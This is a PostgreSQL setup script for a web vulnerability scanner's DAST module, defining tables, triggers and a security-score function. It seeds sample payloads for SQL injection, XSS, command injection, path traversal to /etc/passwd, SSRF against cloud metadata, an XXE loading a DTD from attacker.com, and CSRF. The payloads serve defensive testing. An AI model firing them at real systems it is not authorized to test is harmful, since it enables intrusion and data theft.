-- DAST Database Initialization Script
-- This script creates all necessary tables for the DAST module

-- Enable UUID extension if not already enabled
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Create DAST Projects table
CREATE TABLE IF NOT EXISTS dast_projects (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name VARCHAR(255) NOT NULL,
    target_url TEXT NOT NULL,
    description TEXT,
    auth_type VARCHAR(20) DEFAULT 'none',
    auth_config JSONB,
    scan_config JSONB,
    scope_config JSONB,
    is_active BOOLEAN DEFAULT TRUE,
    tags JSONB,
    total_scans INTEGER DEFAULT 0,
    total_vulnerabilities INTEGER DEFAULT 0,
    security_score FLOAT,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    last_scan TIMESTAMP,
    created_by INTEGER REFERENCES users(id)
);

-- Create DAST Scans table
CREATE TABLE IF NOT EXISTS dast_scans (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    project_id UUID REFERENCES dast_projects(id) ON DELETE CASCADE,
    scan_type VARCHAR(20) NOT NULL DEFAULT 'full',
    status VARCHAR(20) DEFAULT 'queued',
    scan_config JSONB,
    auth_config JSONB,
    vulnerabilities_found INTEGER DEFAULT 0,
    urls_scanned INTEGER DEFAULT 0,
    requests_made INTEGER DEFAULT 0,
    scan_duration FLOAT,
    scan_logs JSONB,
    scan_summary JSONB,
    evidence_files JSONB,
    started_at TIMESTAMP DEFAULT NOW(),
    completed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    initiated_by INTEGER REFERENCES users(id)
);

-- Create DAST Vulnerabilities table
CREATE TABLE IF NOT EXISTS dast_vulnerabilities (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES dast_scans(id) ON DELETE CASCADE,
    project_id UUID REFERENCES dast_projects(id) ON DELETE CASCADE,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    severity VARCHAR(20) NOT NULL,
    status VARCHAR(20) DEFAULT 'open',
    url TEXT NOT NULL,
    http_method VARCHAR(10) NOT NULL,
    param_name VARCHAR(100),
    param_value TEXT,
    cwe_id VARCHAR(20),
    owasp_category VARCHAR(100),
    vuln_type VARCHAR(50),
    payload TEXT,
    evidence JSONB,
    proof_of_concept TEXT,
    response_code INTEGER,
    response_time FLOAT,
    response_size INTEGER,
    tags JSONB,
    metadata JSONB,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    fixed_at TIMESTAMP
);

-- Create DAST Payloads table
CREATE TABLE IF NOT EXISTS dast_payloads (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name VARCHAR(255) NOT NULL,
    vuln_type VARCHAR(50) NOT NULL,
    payload TEXT NOT NULL,
    description TEXT,
    severity VARCHAR(20) NOT NULL,
    cwe_id VARCHAR(20),
    owasp_category VARCHAR(100),
    language VARCHAR(50),
    tags JSONB,
    metadata JSONB,
    is_active BOOLEAN DEFAULT TRUE,
    is_custom BOOLEAN DEFAULT FALSE,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    created_by INTEGER REFERENCES users(id)
);

-- Create DAST Reports table
CREATE TABLE IF NOT EXISTS dast_reports (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    scan_id UUID REFERENCES dast_scans(id) ON DELETE CASCADE,
    project_id UUID REFERENCES dast_projects(id) ON DELETE CASCADE,
    report_type VARCHAR(50) NOT NULL,
    format VARCHAR(20) NOT NULL,
    report_data JSONB,
    report_file_path TEXT,
    generated_at TIMESTAMP DEFAULT NOW(),
    expires_at TIMESTAMP,
    is_public BOOLEAN DEFAULT FALSE,
    download_count INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    generated_by INTEGER REFERENCES users(id)
);

-- Create DAST Sessions table
CREATE TABLE IF NOT EXISTS dast_sessions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    project_id UUID REFERENCES dast_projects(id) ON DELETE CASCADE,
    session_name VARCHAR(255) NOT NULL,
    session_type VARCHAR(50) NOT NULL,
    session_config JSONB,
    auth_config JSONB,
    requests_log JSONB,
    responses_log JSONB,
    cookies JSONB,
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    last_activity TIMESTAMP,
    created_by INTEGER REFERENCES users(id)
);

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_dast_projects_created_by ON dast_projects(created_by);
CREATE INDEX IF NOT EXISTS idx_dast_projects_is_active ON dast_projects(is_active);
CREATE INDEX IF NOT EXISTS idx_dast_projects_created_at ON dast_projects(created_at);

CREATE INDEX IF NOT EXISTS idx_dast_scans_project_id ON dast_scans(project_id);
CREATE INDEX IF NOT EXISTS idx_dast_scans_status ON dast_scans(status);
CREATE INDEX IF NOT EXISTS idx_dast_scans_created_at ON dast_scans(created_at);
CREATE INDEX IF NOT EXISTS idx_dast_scans_initiated_by ON dast_scans(initiated_by);

CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_scan_id ON dast_vulnerabilities(scan_id);
CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_project_id ON dast_vulnerabilities(project_id);
CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_severity ON dast_vulnerabilities(severity);
CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_status ON dast_vulnerabilities(status);
CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_vuln_type ON dast_vulnerabilities(vuln_type);
CREATE INDEX IF NOT EXISTS idx_dast_vulnerabilities_created_at ON dast_vulnerabilities(created_at);

CREATE INDEX IF NOT EXISTS idx_dast_payloads_vuln_type ON dast_payloads(vuln_type);
CREATE INDEX IF NOT EXISTS idx_dast_payloads_severity ON dast_payloads(severity);
CREATE INDEX IF NOT EXISTS idx_dast_payloads_is_active ON dast_payloads(is_active);
CREATE INDEX IF NOT EXISTS idx_dast_payloads_created_by ON dast_payloads(created_by);

CREATE INDEX IF NOT EXISTS idx_dast_reports_scan_id ON dast_reports(scan_id);
CREATE INDEX IF NOT EXISTS idx_dast_reports_project_id ON dast_reports(project_id);
CREATE INDEX IF NOT EXISTS idx_dast_reports_generated_at ON dast_reports(generated_at);

CREATE INDEX IF NOT EXISTS idx_dast_sessions_project_id ON dast_sessions(project_id);
CREATE INDEX IF NOT EXISTS idx_dast_sessions_is_active ON dast_sessions(is_active);
CREATE INDEX IF NOT EXISTS idx_dast_sessions_created_by ON dast_sessions(created_by);

-- Insert sample DAST payloads
INSERT INTO dast_payloads (name, vuln_type, payload, description, severity, cwe_id, owasp_category) VALUES
-- SQL Injection payloads
('SQL Injection - Basic', 'sqli', "' OR 1=1 --", 'Basic SQL injection payload', 'critical', 'CWE-89', 'A03:2021-Injection'),
('SQL Injection - Union', 'sqli', "' UNION SELECT NULL,NULL,NULL--", 'Union-based SQL injection', 'critical', 'CWE-89', 'A03:2021-Injection'),
('SQL Injection - Boolean', 'sqli', "' AND 1=1--", 'Boolean-based SQL injection', 'critical', 'CWE-89', 'A03:2021-Injection'),

-- XSS payloads
('XSS - Basic', 'xss', '<script>alert("XSS")</script>', 'Basic XSS payload', 'high', 'CWE-79', 'A03:2021-Injection'),
('XSS - Event Handler', 'xss', '" onmouseover="alert(\'XSS\')"', 'Event handler XSS', 'high', 'CWE-79', 'A03:2021-Injection'),
('XSS - Image Tag', 'xss', '<img src=x onerror=alert("XSS")>', 'Image tag XSS', 'high', 'CWE-79', 'A03:2021-Injection'),

-- Command Injection payloads
('Command Injection - Basic', 'cmdi', '; ls -la', 'Basic command injection', 'critical', 'CWE-78', 'A03:2021-Injection'),
('Command Injection - Pipe', 'cmdi', '| whoami', 'Pipe-based command injection', 'critical', 'CWE-78', 'A03:2021-Injection'),
('Command Injection - Backtick', 'cmdi', '`id`', 'Backtick command injection', 'critical', 'CWE-78', 'A03:2021-Injection'),

-- Path Traversal payloads
('Path Traversal - Basic', 'lfi', '../../../etc/passwd', 'Basic path traversal', 'high', 'CWE-22', 'A01:2021-Broken Access Control'),
('Path Traversal - Encoded', 'lfi', '..%2F..%2F..%2Fetc%2Fpasswd', 'URL-encoded path traversal', 'high', 'CWE-22', 'A01:2021-Broken Access Control'),
('Path Traversal - Double', 'lfi', '....//....//....//etc/passwd', 'Double-encoded path traversal', 'high', 'CWE-22', 'A01:2021-Broken Access Control'),

-- SSRF payloads
('SSRF - Localhost', 'ssrf', 'http://localhost:8080', 'SSRF to localhost', 'high', 'CWE-918', 'A05:2021-Security Misconfiguration'),
('SSRF - Internal IP', 'ssrf', 'http://192.168.1.1', 'SSRF to internal IP', 'high', 'CWE-918', 'A05:2021-Security Misconfiguration'),
('SSRF - Metadata', 'ssrf', 'http://169.254.169.254/latest/meta-data/', 'AWS metadata SSRF', 'high', 'CWE-918', 'A05:2021-Security Misconfiguration'),

-- XXE payloads
('XXE - Basic', 'xxe', '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>', 'Basic XXE payload', 'critical', 'CWE-611', 'A05:2021-Security Misconfiguration'),
('XXE - Parameter', 'xxe', '<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><test>&evil;</test>', 'Parameter entity XXE', 'critical', 'CWE-611', 'A05:2021-Security Misconfiguration'),

-- CSRF payloads
('CSRF - Form', 'csrf', '<form action="http://target.com/change-password" method="POST"><input name="new_password" value="hacked"/></form><script>document.forms[0].submit()</script>', 'CSRF form submission', 'medium', 'CWE-352', 'A01:2021-Broken Access Control'),

-- Security Headers check
('Security Headers - Missing', 'security_headers', 'X-Frame-Options: DENY', 'Check for missing security headers', 'medium', 'CWE-693', 'A05:2021-Security Misconfiguration')
ON CONFLICT DO NOTHING;

-- Create a function to update the updated_at timestamp
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

-- Create triggers to automatically update the updated_at column
CREATE TRIGGER update_dast_projects_updated_at BEFORE UPDATE ON dast_projects FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_dast_scans_updated_at BEFORE UPDATE ON dast_scans FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_dast_vulnerabilities_updated_at BEFORE UPDATE ON dast_vulnerabilities FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_dast_payloads_updated_at BEFORE UPDATE ON dast_payloads FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_dast_reports_updated_at BEFORE UPDATE ON dast_reports FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();
CREATE TRIGGER update_dast_sessions_updated_at BEFORE UPDATE ON dast_sessions FOR EACH ROW EXECUTE FUNCTION update_updated_at_column();

-- Create a function to calculate security score
CREATE OR REPLACE FUNCTION calculate_security_score(project_uuid UUID)
RETURNS FLOAT AS $$
DECLARE
    total_vulns INTEGER;
    critical_vulns INTEGER;
    high_vulns INTEGER;
    medium_vulns INTEGER;
    low_vulns INTEGER;
    score FLOAT;
BEGIN
    -- Count vulnerabilities by severity
    SELECT 
        COUNT(*) as total,
        COUNT(*) FILTER (WHERE severity = 'critical') as critical,
        COUNT(*) FILTER (WHERE severity = 'high') as high,
        COUNT(*) FILTER (WHERE severity = 'medium') as medium,
        COUNT(*) FILTER (WHERE severity = 'low') as low
    INTO total_vulns, critical_vulns, high_vulns, medium_vulns, low_vulns
    FROM dast_vulnerabilities 
    WHERE project_id = project_uuid AND status = 'open';
    
    -- Calculate score (100 - weighted sum of vulnerabilities)
    score = 100.0 - (critical_vulns * 10.0 + high_vulns * 5.0 + medium_vulns * 2.0 + low_vulns * 0.5);
    
    -- Ensure score is between 0 and 100
    IF score < 0 THEN
        score = 0.0;
    ELSIF score > 100 THEN
        score = 100.0;
    END IF;
    
    RETURN score;
END;
$$ LANGUAGE plpgsql;

-- Create a function to update project statistics
CREATE OR REPLACE FUNCTION update_project_stats()
RETURNS TRIGGER AS $$
BEGIN
    -- Update project statistics when vulnerabilities are added/updated
    UPDATE dast_projects 
    SET 
        total_vulnerabilities = (
            SELECT COUNT(*) 
            FROM dast_vulnerabilities 
            WHERE project_id = NEW.project_id
        ),
        security_score = calculate_security_score(NEW.project_id),
        updated_at = NOW()
    WHERE id = NEW.project_id;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Create trigger to update project stats when vulnerabilities change
CREATE TRIGGER update_project_stats_trigger 
    AFTER INSERT OR UPDATE OR DELETE ON dast_vulnerabilities 
    FOR EACH ROW EXECUTE FUNCTION update_project_stats();

-- Grant necessary permissions
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO cybershield_user;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO cybershield_user;
GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO cybershield_user;

-- Insert sample DAST project for testing
INSERT INTO dast_projects (name, target_url, description, auth_type, scan_config) VALUES
('Test E-commerce Site', 'https://example.com', 'Test project for DAST functionality', 'none', '{"scan_type": "full", "max_depth": 3, "timeout": 30}')
ON CONFLICT DO NOTHING;

COMMIT; 